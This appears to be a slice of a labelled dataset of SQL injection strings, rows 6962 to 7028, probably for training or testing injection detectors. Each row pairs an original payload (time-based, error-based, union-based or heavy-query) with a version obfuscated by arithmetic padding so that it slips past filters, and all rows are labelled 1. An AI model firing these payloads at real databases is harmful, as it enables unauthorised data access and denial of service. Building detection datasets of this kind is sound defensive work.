,Query,Label,Original
6962,"1  )   as kqas where  0+7302+2*3-6=8-8+7302+0 AND 1 And  0+0+2*3-6+SIN(0)+8407+SIN(0)=2*3-6+(+2*3-6+2/2-1  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- ",1,"1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
6963,"1'+  (  select papc where  SIN(0)+2/2-1+8900+2/2-1+SIN(0)+8-8=8900+SIN(0)+2/2-1 And 1 and elt  (   2*3-6+SIN(0)+8-8+3114+2/2-1+2/2-1=8-8+2/2-1+8-8+3114,sleep+SIN(0)+8-8  (  5   )    )   # ",1,"1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #"
6964,"1% ""   )    )     )   AND 1 AND 1 &&  0+8-8+9660=0+0+SIN(0)+(+2/2-1  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
6965,"-6158 ""   )    )     )   || SIN(0) Or 2/2-1 ||  0+8571+SIN(0)=2*3-6+SIN(0)+0+2/2-1+0+8571-- ",1,"-6158""   )    )     )   or 8571  =  8571--"
6966,"1'  )   AND 1 aNd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88   2*3-6+SIN(0)+)+8-8+8-8+8-8=0+SIN(0)+2/2-1+regexp_substring+8-8+2*3-6  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (   2*3-6+'pbqg'+SIN(0)+8-8=0+'pbqg+2/2-1 ",1,"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg"
6967,"1 ""  )   as sstd where  8-8+2*3-6+9629+SIN(0)+2*3-6=2/2-1+9629+8-8+2*3-6+2/2-1+SIN(0) or 0 Or 8-8 Or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   1808+SIN(0)+8-8+2*3-6=0+1808,1+2*3-6+SIN(0)+SIN(0)   )    )     )  ,0x717a767a71  )  ,8666  )  -- ",1,"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --"
6968,"1'+  (  select 'ycvl' where  8-8+2*3-6+8415+8-8+2/2-1+0=2*3-6+SIN(0)+8415 || SIN(0) or 2/2-1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121   2/2-1+)+2/2-1=SIN(0)+2/2-1+2*3-6+regexp_substring+2/2-1  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
6969,"1%'   )    )     )   and 1 And char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88   0+0+8-8+)+2*3-6+8-8=8-8+regexp_substring+SIN(0)+0+8-8  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (   '%'+2/2-1+2/2-1+8-8=2/2-1+0+2/2-1+8-8+'+8-8 ",1,"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '"
6970,1 Or 8-8 OR 2*3-6 or  0+8-8+6793+2/2-1+SIN(0)=2*3-6+(+2*3-6  select 6793 from pg_sleep  (  5   )    )  ,1,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
6971,"1% "" Or 2*3-6 Or 2/2-1 Or  8384+SIN(0)+2*3-6=2/2-1+like+2/2-1  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    AND 1 And  ""% "" 8-8+SIN(0)++2*3-6=2*3-6+SIN(0)++SIN(0) "" ",1,"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """
6972,"-5560 ""   )    )    OR 2*3-6 Or  7292+8-8+0=0+2*3-6+2*3-6+6184 #",1,"-5560""   )    )    or 7292  =  6184#"
6973,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   aNd 1 and    (    (     (   SIN(0)+2/2-1+'gsup'+2*3-6+SIN(0)=SIN(0)+'gsup+8-8+2*3-6+SIN(0) ",1,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup"
6974,"-3013'  )   where  2/2-1+2027+2/2-1=0+2027+2*3-6+2*3-6+8-8+8-8 union all select 2027,2027,2027,2027-- ",1,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--"
6975,"1 ""  )   or 8-8 Or 2*3-6 or sleep  (  5  )  # ",1,"1""  )   or sleep  (  5  )  #"
6976,"1'+  (  select qjng where  8-8+2/2-1+0+1897+2/2-1=2/2-1+1897+8-8 aNd 1 and 1 AND  0+SIN(0)+6414=8-8+8-8+SIN(0)+(+2*3-6+8-8  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +' ",1,"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'"
6977,1   )    )    as eigk where  2/2-1+SIN(0)+SIN(0)+0+2557+2/2-1=0+2557+SIN(0)+SIN(0)+2*3-6+2/2-1 ,1,1   )    )    as eigk where 2557  =  2557
6978,1'||  (  select 'gbyh' from dual where  8-8+8-8+SIN(0)+0+5889+2*3-6=0+5889+2/2-1+SIN(0) order by 1# ,1,1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#
6979,"1   )    )    as rqbo where  SIN(0)+2/2-1+2243+0+8-8=2*3-6+2/2-1+2243+0+SIN(0) aND 1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (   2/2-1+2/2-1+8190+2*3-6=2/2-1+8190,1+2*3-6+SIN(0)+8-8   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- ",1,"1   )    )    as rqbo where 2243  =  2243 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"
6980,"1  )   aNd 1 && 1 &&  SIN(0)+SIN(0)+4241=2*3-6+0+convert+SIN(0)  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2*3-6+8-8+2/2-1+4241+0=SIN(0)+2/2-1+4241+8-8+0  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   ",1,"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  "
6981,"1% ""   )    )     )   Or 2/2-1 Or 0 || exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (   SIN(0)+SIN(0)+6270+2/2-1+2*3-6+8-8=2*3-6+8-8+SIN(0)+6270,1+SIN(0)+2/2-1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aND 1 aND    (    (     (   ""% "" 0++8-8+0=SIN(0)+8-8++2*3-6 "" ",1,"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """
6982,"1' in boolean mode  )   AND 1 AND  3202+SIN(0)+0+2*3-6=8-8+SIN(0)+like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # ",1,"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #"
6983,"1 ""   )    )    as tpeh where  2/2-1+6306+0=2*3-6+6306+SIN(0)+SIN(0)+SIN(0)+0 aNd 1 AND  0+2*3-6+2*3-6+5965+8-8+SIN(0)=8-8+5806+SIN(0)+0+SIN(0) #",1,"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#"
6984,"1' where  8-8+1272+0+0=0+8-8+1272+8-8 Or 2*3-6 or  0+0+2633+2*3-6+2*3-6+8-8=2*3-6+dbms_pipe.receive_message+8-8  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- ",1,"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --"
6985,-7072'  )   OR SIN(0) || 8-8 Or  0+2*3-6+0+4144+SIN(0)=(+SIN(0)+0  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   SIN(0)+0+0+4144=0+SIN(0)+8-8+0+4144+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ,1,-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 
6986,"-5288'  )   or 2/2-1 Or make_set  (   2/2-1+2*3-6+1164+0+2/2-1+2/2-1=8-8+1710,1710+2*3-6  )   AND 1 aNd 1 And   (   8-8+8-8+'pkwy'+8-8=8-8+'pkwy+0+0 ",1,"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy"
6987,1'+  (  select 'tjvt' where  2*3-6+0+0+2/2-1+2463+2/2-1=2463+8-8+0+2/2-1+SIN(0)+2/2-1 ,1,1'+  (  select 'tjvt' where 2463  =  2463
6988,"1  )   or 2*3-6 Or SIN(0) or  2*3-6+SIN(0)+2/2-1+8384=8-8+0+like+0+2*3-6  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ",1,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   "
6989,"1'   )    )    as ijyi where  8-8+3694+2/2-1=0+3694+2/2-1   (  select   (  case when   (   SIN(0)+SIN(0)+SIN(0)+5451+2/2-1=5451+2*3-6+0+2*3-6  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  -- ",1,"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --"
6990,1%'   )    )     )   AND 1 aND  SIN(0)+6969+SIN(0)=8-8+(+8-8+2/2-1+2*3-6  select 6969 from pg_sleep  (  5   )    )    and    (    (     (   '%'+2*3-6+2/2-1=0+SIN(0)+' ,1,1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  '
6991,1%'   )    )    or SIN(0) Or sleep  (  5  )   And 1 aND    (    (    2/2-1+'%'+8-8=2*3-6+SIN(0)+'+8-8+2/2-1 ,1,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  '
6992,"1 ""   )    )    AND 1 and  SIN(0)+7756+0+8-8+2*3-6=2*3-6+0+8-8+2*3-6+dbms_utility.sqlid_to_sqlhash+8-8   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  OR SIN(0) Or  (  select   (  case when   (   7756+8-8+0+2/2-1=7756+SIN(0)+SIN(0)  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (    ""fuus "" like  ""fuus ",1,"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""fuus"" like ""fuus"
6993,"1 ""  )   AND 1 aND  2*3-6+8-8+2954+2*3-6+SIN(0)+8-8=2*3-6+1256--+0 ",1,"1""  )   and 2954  =  1256--"
6994,"-3587'  )   or 2/2-1 OR 0 OR  SIN(0)+2/2-1+2*3-6+2/2-1+5023+8-8=SIN(0)+2/2-1+ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2/2-1+5023+2*3-6+2*3-6=SIN(0)+8-8+5023+SIN(0)+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 1 && 1 And   (  'psqt' like 'psqt ",1,"-3587'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt"
6995,"1' in boolean mode  )   or 2/2-1 Or SIN(0) or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (   8113+8-8+0=2*3-6+8113,1+SIN(0)   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # ",1,"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #"
6996,"-7347 ""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360# ",1,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#"
6997,"1'  )   aND 1 AND  3202+8-8+SIN(0)=8-8+like+0+2*3-6+8-8  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz ",1,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz"
6998,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   ",1,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  "
6999,"1'   )    )     )   AND 1 aND extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   8-8+8-8+SIN(0)+7982+0+2/2-1=7982,1+2/2-1+SIN(0)   )    )     )  ,0x717a767a71   )    )    and    (    (     (   'vpus'+2*3-6+2/2-1='vpus+8-8+8-8 ",1,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus"
7000,"1% ""   )    )     )   and 1 aNd   (   0+3502+2/2-1=7893+SIN(0)+0  )  *7893 and    (    (     (   ""% "" 2/2-1+SIN(0)++8-8=SIN(0)+2*3-6++0+2/2-1+2*3-6 "" ",1,"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """
7001,"1 ""   )    )    union all select null,null,null,null# ",1,"1""   )    )    union all select null,null,null,null#"
7002,"1'   )    )     )   OR SIN(0) Or  0+5286+2*3-6=8-8+2*3-6+(  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aND 1 aNd 1 and    (    (     (   SIN(0)+'ewwi'+SIN(0)=SIN(0)+'ewwi+2/2-1+2*3-6+2*3-6+8-8 ",1,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi"
7003,"1 ""  )   as ronb where  0+2/2-1+9368+0+8-8+SIN(0)=2/2-1+9368+2*3-6 ",1,"1""  )   as ronb where 9368  =  9368"
7004,1 && 1 && 1 And  2/2-1+SIN(0)+3754=2/2-1+(+SIN(0)+2/2-1  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  oR 8-8 ||  (  select   (  case when   (   8-8+0+0+2*3-6+3754=8-8+2*3-6+3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo ,1,1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo
7005,"1 ""   )    )    Or 8-8 oR 0 or  2633+SIN(0)+2/2-1+0=dbms_pipe.receive_message+0+SIN(0)+SIN(0)+2*3-6  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   aNd 1 aNd    (    (    ""nubc "" like  ""nubc ",1,"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc"
7006,1   )    )    as oqyo where  SIN(0)+0+7995+8-8=7995+2/2-1+2/2-1+8-8 ,1,1   )    )    as oqyo where 7995  =  7995
7007,"1  )   where  8-8+2*3-6+0+8-8+1415+8-8=2/2-1+1415+2*3-6 aND 1 and  8-8+6537+2/2-1+2/2-1+SIN(0)+SIN(0)=2/2-1+dbms_pipe.receive_message+8-8+0+8-8  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- ",1,"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"
7008,"1' in boolean mode  )   aND 1 and 1 and  6055+0+2*3-6=ctxsys.drithsx.sn+8-8+8-8  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  oR 2/2-1 Or  (  select   (  case when   (   0+6055+2/2-1+8-8=2/2-1+6055+2/2-1+0+2*3-6+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # ",1,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #"
7009,"1 ""  )   where  2*3-6+0+0+9359+0=SIN(0)+0+9359+SIN(0)+0+8-8 OR SIN(0) OR  8-8+2/2-1+2367=8-8+(+0  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- ",1,"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
7010,"1%'   )    )     )   Or 2*3-6 OR 2*3-6 OR  0+2*3-6+1022+2*3-6+0+0=(+SIN(0)+2/2-1  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
7011,select   (  case when   (   2/2-1+2/2-1+0+2/2-1+2*3-6+5142=2*3-6+6855+SIN(0)  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  # ,1,select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #
7012,select   (  case when   (   2*3-6+9130+0+SIN(0)+2*3-6=2/2-1+1826+8-8+2*3-6+SIN(0)  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  # ,1,select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #
7013,"1' or SIN(0) Or  SIN(0)+8-8+7552=0+(+SIN(0)+2*3-6  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   && 1 And 1 And 'ugum' like 'ugum ",1,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum"
7014,1%'  )   AND 1 aNd   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (   0+SIN(0)+'%'=8-8+SIN(0)+'+2*3-6+SIN(0) ,1,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  '
7015,"1%' or 2*3-6 Or SIN(0) || SIN(0) Or elt  (   2*3-6+6272+SIN(0)+8-8=0+6272,sleep+2/2-1+8-8  (  5   )    )    AND 1 and 1 &&  SIN(0)+SIN(0)+'%'='+0+2*3-6+2*3-6 ",1,"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '"
7016,"1% ""   )    )    OR SIN(0) Or  6793+SIN(0)+8-8+2*3-6+8-8=2/2-1+2*3-6+(+2*3-6  select 6793 from pg_sleep  (  5   )    )    AND 1 aND 1 &&    (    (    ""% "" 8-8+2/2-1+2/2-1++8-8=2/2-1+2/2-1++0+2*3-6+SIN(0) "" ",1,"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """
7017,1'+  (  select ksoh where  SIN(0)+6339+2*3-6=2*3-6+6339+0 ,1,1'+  (  select ksoh where 6339  =  6339
7018,1   )    )    as pmff where  2*3-6+SIN(0)+6649+8-8=2*3-6+6649+8-8 ,1,1   )    )    as pmff where 6649  =  6649
7019,"1'  )   or 2*3-6 OR extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   1297+2/2-1+SIN(0)+SIN(0)+2/2-1=0+0+1297,1   )    )     )  ,0x717a767a71   )    )    ",1,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   "
7020,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||' ",1,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'"
7021,"1 ""   )    )     )   AND 1 AND  2*3-6+SIN(0)+SIN(0)+7135=2*3-6+8805+SIN(0) #",1,"1""   )    )     )   and 7135  =  8805#"
7022,"1 ""   )    )    as xcyo where  SIN(0)+2/2-1+2929+8-8+8-8+0=SIN(0)+8-8+2929+2/2-1+SIN(0) ",1,"1""   )    )    as xcyo where 2929  =  2929"
7023,"-8600 "" OR 2*3-6 OR 2/2-1 Or elt  (   2*3-6+0+8-8+1032+SIN(0)+2*3-6=2*3-6+8-8+1032,3623  )   aND 1 AND  ""kfsn "" like  ""kfsn ",1,"-8600"" or elt  (  1032  =  1032,3623  )   and ""kfsn"" like ""kfsn"
7024,1' and 1 aNd   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and  'gpax'+SIN(0)+2*3-6=8-8+'gpax+0+SIN(0) ,1,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax
7025,"select * from generate_series  (  6200,6200,case when   (   0+0+8-8+6200+0+2/2-1=8-8+5449+0+8-8  )   then 1 else 0 end  )   limit 1-- ",1,"select * from generate_series  (  6200,6200,case when   (  6200  =  5449  )   then 1 else 0 end  )   limit 1--"
7026,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   aND 1 AND 1 aNd  8-8+'gbpg'+2*3-6+8-8+SIN(0)=2*3-6+'gbpg+8-8+SIN(0) ",1,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg"
7027,select   (  case when   (   0+7169+2/2-1=8-8+0+7785+2/2-1+SIN(0)+2/2-1  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  -- ,1,select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --
7028,"1 ""   )    )     )   AND 1 && 1 aND sleep  (  5  )   and    (    (     (   ""fdvc "" like  ""fdvc ",1,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc"
